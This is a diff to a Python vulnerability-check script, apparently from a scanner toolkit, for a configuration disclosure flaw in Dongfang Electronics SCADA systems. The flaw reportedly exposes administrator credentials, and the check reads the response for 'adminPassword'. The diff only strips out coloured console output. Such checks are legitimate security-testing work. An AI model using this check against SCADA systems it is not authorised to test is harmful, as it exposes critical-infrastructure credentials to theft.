@@ -9,8 +9,7 @@ description: 敏感信息泄露,可获取管理员账号和口令。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
 
 class dfe_scada_conf_disclosure_BaseVerify:
     def __init__(self, url):
@@ -25,18 +24,14 @@ class dfe_scada_conf_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"productName" in req.text and r"adminPassword" in req.text:
-                cprint("[+]存在东方电子SCADA通用系统信息泄露漏洞...(高危)\tpayload: "+vulnurl, "red")
                 return True, vulnurl, "东方电子SCADA通用系统信息泄露", str(payload), req.text
             else:
-                cprint("[-]不存在dfe_scada_conf_disclosure漏洞", "white", "on_grey")
                 return False, None, None, None, None
 
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = dfe_scada_conf_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
